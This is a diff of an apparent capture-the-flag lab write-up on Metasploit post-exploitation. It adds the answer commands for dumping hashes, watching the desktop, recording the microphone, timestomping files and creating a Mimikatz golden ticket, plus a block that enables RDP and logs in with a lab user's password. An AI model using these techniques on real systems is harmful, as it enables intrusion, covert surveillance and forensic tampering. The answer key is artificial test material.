@@ -455,63 +455,45 @@ Before we start our post-exploitation, let's revisit the help menu one last time
 
 ### 6.1 - What command allows us to dump all of the password hashes stored on the system? We won't crack the Administrative password in this case as it's pretty strong (this is intentional to avoid password spraying attempts)
 
-
-
-
-
 {% hint style="info" %}
-
+hashdump
 {% endhint %}
 
 ### 6.2 - While more useful when interacting with a machine being used, what command allows us to watch the remote user's desktop in real time?
 
-\
-
-
-
-
-
-
 {% hint style="info" %}
-
+screenshare
 {% endhint %}
 
 ### 6.3 - How about if we wanted to record from a microphone attached to the system?
 
-
-
-
-
-
-
 {% hint style="info" %}
-
+record\_mic
 {% endhint %}
 
 ### 6.4 - To complicate forensics efforts we can modify timestamps of files on the system. What command allows us to do this? Don't ever do this on a pentest unless you're explicitly allowed to do so! This is not beneficial to the defending team as they try to breakdown the events of the pentest after the fact.
 
-
-
-
-
-
-
 {% hint style="info" %}
-
+timestomp
 {% endhint %}
 
 Mimikatz allows us to create what's called a `golden ticket`, allowing us to authenticate anywhere with ease. What command allows us to do this?
 
 ### 6.5 - Golden ticket attacks are a function within Mimikatz which abuses a component to Kerberos (the authentication system in Windows domains), the ticket-granting ticket. In short, golden ticket attacks allow us to maintain persistence and authenticate as any user on the domain.
 
-
-
-
-
-
-
 {% hint style="info" %}
-
+golden\_ticket\_create
 {% endhint %}
 
 One last thing to note. As we have the password for the user 'Dark' we can now authenticate to the machine and access it via remote desktop (MSRDP). As this is a workstation, we'd likely kick whatever user is signed onto it off if we connect to it, however, it's always interesting to remote into machines and view them as their users do. If this hasn't already been enabled, we can enable it via the following Metasploit module: \`run post/windows/manage/enable\_rdp\`
+
+```bash
+run post/windows/manage/enable_rdp
+xfreerdp /u:Dark /p:Password01! /v:10.9.80.228
+```
+
+<div align="left">
+
+<figure><img src=".gitbook/assets/Schermata del 2023-07-30 21-03-24.png" alt=""><figcaption></figcaption></figure>
+
+</div>
